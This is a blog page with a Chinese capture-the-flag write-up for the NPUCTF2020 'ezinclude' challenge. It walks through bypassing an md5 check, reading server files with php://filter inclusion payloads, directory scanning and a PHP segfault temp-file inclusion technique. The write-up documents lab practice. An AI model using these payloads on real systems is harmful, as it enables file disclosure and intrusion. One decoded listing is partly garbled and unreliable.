@@ -1,0 +1,816 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="South">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[NPUCTF2020]ezinclude参考:[NPUCTF2020]ezinclude-CSDN博客 https:&#x2F;&#x2F;github.com&#x2F;H4ckForJob&#x2F;dirmap&#x2F;blob&#x2F;master&#x2F;data&#x2F; [NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc) 场景: 查看网页源代码: 得到提示信息: 1&lt;!--md5($">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF_[NPUCTF2020]ezinclude">
+<meta property="og:url" content="http://example.com/2024/02/18/2024-02-18-[NPUCTF2020]ezinclude/index.html">
+<meta property="og:site_name" content="South">
+<meta property="og:description" content="[NPUCTF2020]ezinclude参考:[NPUCTF2020]ezinclude-CSDN博客 https:&#x2F;&#x2F;github.com&#x2F;H4ckForJob&#x2F;dirmap&#x2F;blob&#x2F;master&#x2F;data&#x2F; [NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc) 场景: 查看网页源代码: 得到提示信息: 1&lt;!--md5($">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206143845264.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206143907330.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206144517403.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206144623159.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206144721294.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206144858912.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206145214434.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206145342309.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206145854174.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206150245971.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206150606969.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206160429411.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206160708008.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206162913121.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206175058318.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206175712022.png">
+<meta property="article:published_time" content="2024-02-18T15:35:55.588Z">
+<meta property="article:modified_time" content="2024-02-18T16:01:47.849Z">
+<meta property="article:author" content="South">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2024-2-18/image-20240206143845264.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BUUCTF_[NPUCTF2020]ezinclude - South</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","app_key":"PmUqfFPhyiQDRYmHOO0IXjTV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>South</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF_[NPUCTF2020]ezinclude"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-18 23:35" pubdate>
+          2024年2月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF_[NPUCTF2020]ezinclude</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45646006/article/details/120817553">NPUCTF2020]ezinclude-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/H4ckForJob/dirmap/blob/master/data/">https://github.com/H4ckForJob/dirmap/blob/master/data/</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1159.html">NPUCTF2020]ezinclude（PHP临时文件包含） – 「配枪朱丽叶。」 (shawroot.cc)</a></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240206143845264.png" srcset="/img/loading.gif" lazyload alt="image-20240206143845264"></p>
+<h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码:"></a>查看网页源代码:</h2><p><img src="/images/2024-2-18/image-20240206143907330.png" srcset="/img/loading.gif" lazyload alt="image-20240206143907330"></p>
+<p>得到提示信息:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;!--md5($secret.$name)===$pass --&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这里要求我们$secret.$name的md5值要和$pass相等</p>
+<h3 id="猜测"><a href="#猜测" class="headerlink" title="猜测:"></a>猜测:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">如果$name和$pass的参数我们不可控，那么我们将无法绕过这个判断，即这个提示就没有任何的意义(因为我已经对网站的后台文件都进行扫描还是没有发现什么有用的文件)，所以这两个参数必须可控，现在假设我们可以输入这两个参数的值，$name我们输入一个值，那么我们也需要知道$secret.$name的md5的值才可以输入$pass的值，如果我们先输入$pass的值，但是由于不知道$secret的值，所以无法输入$name的值，所以如果要让这个提示存在意义，那么就是我们输入$name的值，同时获取到$secret.$name的加密值<br></code></pre></td></tr></table></figure>
+
+<h2 id="BP抓包进一步收集信息"><a href="#BP抓包进一步收集信息" class="headerlink" title="BP抓包进一步收集信息:"></a>BP抓包进一步收集信息:</h2><p><img src="/images/2024-2-18/image-20240206144517403.png" srcset="/img/loading.gif" lazyload alt="image-20240206144517403"></p>
+<p>发现cookie存在一个hash值</p>
+<h3 id="随意输入一个name的值"><a href="#随意输入一个name的值" class="headerlink" title="随意输入一个name的值:"></a>随意输入一个name的值:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206144623159.png" srcset="/img/loading.gif" lazyload alt="image-20240206144623159"></p>
+<p>发现响应结果中存在一个Set-Cookie: Hash&#x3D;576322dd496b99d07b5b0f7fa7934a25;</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=2<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206144721294.png" srcset="/img/loading.gif" lazyload alt="image-20240206144721294"></p>
+<p>发现不同的name回显不同的set-cookie值，猜测该hash值就是$secret.$name的md5加密值</p>
+<h2 id="验证猜测"><a href="#验证猜测" class="headerlink" title="验证猜测:"></a>验证猜测:</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206144858912.png" srcset="/img/loading.gif" lazyload alt="image-20240206144858912"></p>
+<p>成功回显一个文件信息:flflflflag.php</p>
+<h2 id="访问flflflflag-php："><a href="#访问flflflflag-php：" class="headerlink" title="访问flflflflag.php："></a>访问flflflflag.php：</h2><p><img src="/images/2024-2-18/image-20240206145214434.png" srcset="/img/loading.gif" lazyload alt="image-20240206145214434"></p>
+<p>直接跳转到404.html上了，没有访问flflflflag.php，可能是直接进行跳转了，可以用抓包拦截一下</p>
+<h2 id="BP抓包拦截flflflflag-php："><a href="#BP抓包拦截flflflflag-php：" class="headerlink" title="BP抓包拦截flflflflag.php："></a>BP抓包拦截flflflflag.php：</h2><p><img src="/images/2024-2-18/image-20240206145342309.png" srcset="/img/loading.gif" lazyload alt="image-20240206145342309"></p>
+<p>根据响应包内容确实获取到，访问该页面时会自动跳转到404.html,同时获得提示信息:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">include($_GET[&quot;file&quot;])<br></code></pre></td></tr></table></figure>
+
+<p>该文件存在文件包含漏洞</p>
+<h2 id="构造文件包含payload"><a href="#构造文件包含payload" class="headerlink" title="构造文件包含payload:"></a>构造文件包含payload:</h2><p><strong>由于我们现在只知道一个index.php和flflflflag.php，所以先获取这两个文件的信息</strong></p>
+<h3 id="获取flflflflag-php信息payload1"><a href="#获取flflflflag-php信息payload1" class="headerlink" title="获取flflflflag.php信息payload1:"></a>获取flflflflag.php信息payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./flflflflag.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206145854174.png" srcset="/img/loading.gif" lazyload alt="image-20240206145854174"></p>
+<h4 id="回显内容"><a href="#回显内容" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PGh0bWw+CjxoZWFkPgo8c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmPSI0MDQuaHRtbCI7Cjwvc2NyaXB0Pgo8dGl0bGU+dGhpc19pc19ub3RfZmw0Z19hbmRf5Ye66aKY5Lq6X3dhbnRzX2dpcmxmcmllbmQ8L3RpdGxlPgo8L2hlYWQ+Cjw+Cjxib2R5Pgo8P3BocAokZmlsZT0kX0dFVFsnZmlsZSddOwppZihwcmVnX21hdGNoKCcvZGF0YXxpbnB1dHx6aXAvaXMnLCRmaWxlKSl7CglkaWUoJ25vbm9ubycpOwp9CkBpbmNsdWRlKCRmaWxlKTsKZWNobyAnaW5jbHVkZSgkX0dFVFsiZmlsZSJdKSc7Cj8+CjwvYm9keT4KPC9odG1sPgo=<br></code></pre></td></tr></table></figure>
+
+<h4 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码:"></a>base64解码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;script language=<span class="hljs-string">&quot;javascript&quot;</span> type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>           window.location.href=<span class="hljs-string">&quot;404.html&quot;</span>;<br>&lt;/script&gt;<br>&lt;title&gt;this_is_not_fl4g_and_鍑洪浜篲wants_girlfriend&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;&gt;<br>&lt;body&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data|input|zip/is&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>&#125;<br>@<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="获取index-php文件信息paylaod2"><a href="#获取index-php文件信息paylaod2" class="headerlink" title="获取index.php文件信息paylaod2:"></a>获取index.php文件信息paylaod2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./index.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206150245971.png" srcset="/img/loading.gif" lazyload alt="image-20240206150245971"></p>
+<h4 id="回显内容-1"><a href="#回显内容-1" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKaW5jbHVkZSAnY29uZmlnLnBocCc7CkAkbmFtZT0kX0dFVFsnbmFtZSddOwpAJHBhc3M9JF9HRVRbJ3Bhc3MnXTsKaWYobWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MpewoJZWNobyAnPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCIgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KICAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZj0iZmxmbGZsZmxhZy5waHAiOwoJPC9zY3JpcHQ Cic7Cn1lbHNlewoJc2V0Y29va2llKCJIYXNoIixtZDUoJHNlY3JldC4kbmFtZSksdGltZSgpKzM2MDAwMDApOwoJZWNobyAidXNlcm5hbWUvcGFzc3dvcmQgZXJyb3IiOwp9Cj8 CjxodG1sPgo8IS0tbWQ1KCRzZWNyZXQuJG5hbWUpPT09JHBhc3MgLS0 CjwvaHRtbD4K<br></code></pre></td></tr></table></figure>
+
+<h4 id="base64解码-1"><a href="#base64解码-1" class="headerlink" title="base64解码:"></a>base64解码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br>@<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>@<span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$name</span>)===<span class="hljs-variable">$pass</span>)&#123;<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="hljs-string">           window.location.href=&quot;flflflflag.php&quot;;</span><br><span class="hljs-string">	&lt;/script壩聼Y[賌聜\賋圹谮YJ?\??Y</span><br><span class="hljs-string">J	賆軝]?榌YJK[YJ</span><br><span class="hljs-string">J掏?</span><br><span class="hljs-string">N聜YX??漒賊洏[YK?\茌圮?\湜軋幝烞徖Ｆ嘑置啵?抑諧R侴6V7&amp;WB釬?諶撚右G72倚(鸾⊙蛋?</span><br></code></pre></td></tr></table></figure>
+
+<p>发现存在一个config.php,我们可以读取一下</p>
+<h3 id="获取config-php信息payload3"><a href="#获取config-php信息payload3" class="headerlink" title="获取config.php信息payload3:"></a>获取config.php信息payload3:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./config.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206150606969.png" srcset="/img/loading.gif" lazyload alt="image-20240206150606969"></p>
+<h4 id="回显内容-2"><a href="#回显内容-2" class="headerlink" title="回显内容:"></a>回显内容:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHAKJHNlY3JldD0nJV4kJiQjZmZmZGZsYWdfaXNfbm90X2hlcmVfaGFfaGEnOwo/Pgo=<br></code></pre></td></tr></table></figure>
+
+<h4 id="base64解码："><a href="#base64解码：" class="headerlink" title="base64解码："></a>base64解码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret</span>=<span class="hljs-string">&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>所有的文件信息都获取了，但是依然没有flag的信息。</p>
+<h2 id="使用dirseach重新扫描网站："><a href="#使用dirseach重新扫描网站：" class="headerlink" title="使用dirseach重新扫描网站："></a>使用dirseach重新扫描网站：</h2><p><strong>(这里使用新下载的字典dict_mode_dict.txt)</strong></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python dirsearch.py -u http://5e0508ab-7d6c-471a-906b-cdfbed6e8c50.node5.buuoj.cn:81/ -e * --timeout=3 -t 1 -x 400,403,404,500,503,429 -w ./dict_mode_dict.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206160429411.png" srcset="/img/loading.gif" lazyload alt="image-20240206160429411"></p>
+<p>扫了两次才出来，以后看来都得至少扫两次，发现一个dir.php文件</p>
+<h2 id="使用文件包含漏洞获取dir-php文件信息"><a href="#使用文件包含漏洞获取dir-php文件信息" class="headerlink" title="使用文件包含漏洞获取dir.php文件信息:"></a>使用文件包含漏洞获取dir.php文件信息:</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flflflflag.php?file=php://filter/read=convert.base64-encode/resource=./dir.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206160708008.png" srcset="/img/loading.gif" lazyload alt="image-20240206160708008"></p>
+<h3 id="回显内容-3"><a href="#回显内容-3" class="headerlink" title="回显内容:"></a>回显内容:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">PD9waHANCnZhcl9kdW1wKHNjYW5kaXIoJy90bXAnKSk7DQo/Pg==<br></code></pre></td></tr></table></figure>
+
+<h3 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密:"></a>base64解密:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="知识点介绍"><a href="#知识点介绍" class="headerlink" title="知识点介绍:"></a>知识点介绍:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">var_dump(scandir(&#x27;/tmp&#x27;));<br>var_dump(scandir(&#x27;/tmp&#x27;)) 这段代码的作用是获取指定目录（这里是 /tmp）下的文件和子目录列表，并将其打印输出。<br><br>具体解释如下：<br><br>scandir(&#x27;/tmp&#x27;) 是 PHP 的内置函数，用于获取指定目录中的所有文件和子目录。在这里，我们指定了目录为 /tmp，即临时目录。<br>scandir(&#x27;/tmp&#x27;) 返回一个数组，包含了目录下的所有文件和子目录的名字（包括 . 和 ..）。<br>var_dump() 是 PHP 的调试函数，用于打印输出变量的详细信息（包括类型和值）。在这里，我们将 scandir(&#x27;/tmp&#x27;) 的返回结果作为参数传递给 var_dump() 函数，以便查看该目录下的文件和子目录列表。<br>所以，这段代码的作用是获取 /tmp 目录下的文件和子目录列表，并将其详细信息打印输出，以便进行调试或查看目录内容。<br></code></pre></td></tr></table></figure>
+
+<p>所以dir.php文件可以用来获取&#x2F;tmp目录下的文件信息</p>
+<h2 id="利用php7-segment-fault特性（CVE-2018-14884）"><a href="#利用php7-segment-fault特性（CVE-2018-14884）" class="headerlink" title="利用php7 segment fault特性（CVE-2018-14884）"></a>利用php7 segment fault特性（CVE-2018-14884）</h2><p><img src="/images/2024-2-18/image-20240206162913121.png" srcset="/img/loading.gif" lazyload alt="image-20240206162913121"></p>
+<p>根据响应包可知，网站的php版本是7.0.33</p>
+<h3 id="PHP临时文件包含"><a href="#PHP临时文件包含" class="headerlink" title="PHP临时文件包含"></a>PHP临时文件包含</h3><h4 id="参考-PHP-LFI-利用临时文件-Getshell-姿势-码农家园-codenong-com"><a href="#参考-PHP-LFI-利用临时文件-Getshell-姿势-码农家园-codenong-com" class="headerlink" title="参考:PHP LFI 利用临时文件 Getshell 姿势 | 码农家园 (codenong.com)"></a>参考:<a target="_blank" rel="noopener" href="https://www.codenong.com/cs106498971/">PHP LFI 利用临时文件 Getshell 姿势 | 码农家园 (codenong.com)</a></h4><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍:"></a>漏洞介绍:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。<br></code></pre></td></tr></table></figure>
+
+<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式:"></a>攻击方式:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">xxx.php是存在文件包含的php文件:<br>url/xxx.php?file=php://filter/string.strip_tags/resource=文件路径<br></code></pre></td></tr></table></figure>
+
